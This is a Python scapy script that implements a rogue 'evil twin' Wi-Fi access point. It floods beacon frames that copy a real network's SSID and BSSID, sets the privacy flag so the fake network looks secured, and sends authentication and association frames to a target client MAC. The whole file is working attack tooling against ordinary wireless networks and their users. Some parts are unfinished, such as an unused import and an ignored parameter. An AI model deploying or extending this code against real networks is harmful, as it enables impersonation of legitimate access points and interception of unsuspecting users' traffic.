from scapy.all import *
from threading import Thread
from faker import Faker
from classes import AccessPoint


ALGO_OPEN_AUTH = 0  # open authentication mode
START_SEQNUM = 1  # sequence number


def send_beacon(ssid, mac, iface, infinite=True):
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
    # ESS+privacy to appear as secured on some devices
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    frame = RadioTap() / dot11 / beacon / essid
    sendp(frame, inter=0.1, loop=1, iface=iface, verbose=0)


def set_channel(AP, iface):
    os.system(f"iwconfig {iface} channel {AP.channel}")


def start_fake_ap(AP, iface):
    # number of access points
    set_channel(AP, iface)
    n_ap = 5
    ssids_macs = [(AP.ssid, AP.bssid) for i in range(n_ap)]
    for ssid, mac in ssids_macs:
        Thread(target=send_beacon, args=(ssid, mac, iface)).start()


def authentication(AP, client, interface):
    print("start authentication")
    recipients_mac_adress = client
    your_mac_adress = AP.bssid
    ssid = AP.ssid
    channel = AP.channel
    frame1 = RadioTap() \
             / Dot11(type=0, subtype=11, addr1=recipients_mac_adress, addr2=your_mac_adress,
                     addr3=recipients_mac_adress) \
             / Dot11Auth(algo=ALGO_OPEN_AUTH, seqnum=START_SEQNUM)
    answer = srp1(frame1, iface=interface)
    answer.show()


def association(AP, client, interface):
    print("start association")
    recipients_mac_adress = client
    your_mac_adress = AP.bssid
    ssid = AP.ssid
    # association
    frame2 = RadioTap() \
             / Dot11(type=0, subtype=0, addr1=recipients_mac_adress, addr2=your_mac_adress, addr3=recipients_mac_adress) \
             / Dot11AssoReq() \
             / Dot11Elt(ID='SSID', info=ssid) \
             / Dot11Elt(ID='Rates', info='\x82\x84\x8b\x96\x0c\x12\x18') \
             / Dot11Elt(ID='ESRates', info='\x30\x48\x60\x6c')
    answer = srp1(frame2, iface=interface)
    answer.show()
